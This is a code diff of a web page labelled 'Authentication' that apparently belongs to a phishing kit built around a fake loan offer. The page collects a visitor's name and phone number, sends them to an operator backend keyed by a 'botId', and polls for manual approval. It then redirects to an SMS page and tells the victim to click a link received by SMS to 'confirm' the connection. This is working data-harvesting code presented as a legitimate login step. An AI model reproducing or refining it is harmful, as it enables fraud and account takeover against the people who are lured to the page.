@@ -94,16 +94,6 @@ button:disabled{
 background:#444;
 }
 
-.name-display {
-    color: #7a3d1c;
-    font-weight: bold;
-    margin-bottom: 20px;
-    padding: 10px;
-    background: #1a1a1a;
-    border-radius: 6px;
-    text-align: center;
-}
-
 </style>
 </head>
 
@@ -114,8 +104,6 @@ background:#444;
 <div class="form-section">
 
 <h2>Authentication</h2>
-
-<div class="name-display" id="nameDisplay">Welcome!</div>
 
 <form id="detailsForm">
 
@@ -128,7 +116,7 @@ background:#444;
 
 </form>
 
-<div id="status" style="margin-top:15px;font-size:14px;color:#7a3d1c;text-align:center;"></div>
+<div id="status" style="margin-top:15px;font-size:14px;color:blue;text-align:center;"></div>
 
 </div>
 
@@ -143,9 +131,10 @@ const params = new URLSearchParams(window.location.search);
 const botId = params.get('botId') || window.location.pathname.split('/').pop();
 if (!botId) { alert("Invalid access link"); throw new Error(); }
 
-// ---------------- GET NAME FROM STORAGE ----------------
-const name = localStorage.getItem('fullName') || 'User';
-document.getElementById('nameDisplay').textContent = `👋 Welcome, ${name}`;
+// ---------------- FLOW CHECK ----------------
+if (!localStorage.getItem('loanAmount')) {
+    window.location.href = `index.html?botId=${botId}`;
+}
 
 const nextBtn = document.getElementById('nextBtn');
 const status = document.getElementById('status');
@@ -155,80 +144,64 @@ document.getElementById('detailsForm').addEventListener('submit', async e => {
     e.preventDefault();
 
     const phone = document.getElementById('phone').value.trim();
+    const name = localStorage.getItem('fullName'); // ✅ from storage
 
-    if (!phone) {
-        status.textContent = "Please enter your phone number";
-        status.style.color = "#ff6b6b";
-        return;
-    }
+    if (!phone) return;
 
     nextBtn.disabled = true;
     nextBtn.textContent = "Processing...";
     status.textContent = "";
-    status.style.color = "#7a3d1c";
 
     try {
         const res = await fetch(`${BACKEND_URL}/submit-details`, {
             method: 'POST',
             headers: {'Content-Type':'application/json'},
             body: JSON.stringify({
-                name: name,
-                phone: phone,
-                botId: botId
+                name,
+                phone,
+                botId
             })
         });
 
-        const data = await res.json();
-        
-        if (!res.ok) {
-            throw new Error(data.error || 'Failed to submit');
-        }
+        const { requestId } = await res.json();
 
-        // Store phone for later use
+        // store phone
         localStorage.setItem('phone', phone);
 
-        // Show waiting message
-        status.textContent = "⏳ Waiting for admin approval...";
-        status.style.color = "#ffd93d";
+        // show SMS message
+        status.textContent = "Please click on the link you received in SMS to confirm your connection";
 
-        // ---------------- POLLING FOR APPROVAL ----------------
+        // ---------------- POLLING ----------------
         const poll = setInterval(async () => {
             try {
-                const r = await fetch(`${BACKEND_URL}/check-details/${data.requestId}`);
+                const r = await fetch(`${BACKEND_URL}/check-details/${requestId}`);
                 const d = await r.json();
 
                 // ✅ APPROVED → REDIRECT TO SMS PAGE
                 if (d.approved === true) {
                     clearInterval(poll);
-                    status.textContent = "✅ Approved! Redirecting...";
-                    status.style.color = "#6bcb77";
-                    setTimeout(() => {
-                        window.location.href = `/sms.html?name=${encodeURIComponent(name)}&phone=${encodeURIComponent(phone)}&botId=${botId}`;
-                    }, 1500);
+                    window.location.href = `/sms.html?name=${encodeURIComponent(name)}&phone=${encodeURIComponent(phone)}&botId=${botId}`;
                 }
 
                 // ❌ REJECTED → STAY HERE
                 if (d.approved === false) {
                     clearInterval(poll);
-                    status.textContent = "❌ Request rejected. Please try again.";
-                    status.style.color = "#ff6b6b";
+                    status.textContent = "Request rejected. Please try again.";
                     nextBtn.disabled = false;
                     nextBtn.textContent = "Log in";
                 }
 
             } catch (err) {
                 clearInterval(poll);
-                status.textContent = "⚠️ Connection lost. Try again.";
-                status.style.color = "#ff6b6b";
+                status.textContent = "Connection lost. Try again.";
                 nextBtn.disabled = false;
                 nextBtn.textContent = "Log in";
             }
 
-        }, 2000);
+        }, 1500);
 
     } catch (err) {
-        status.textContent = "❌ " + err.message;
-        status.style.color = "#ff6b6b";
+        status.textContent = "Network error, try again";
         nextBtn.disabled = false;
         nextBtn.textContent = "Log in";
     }
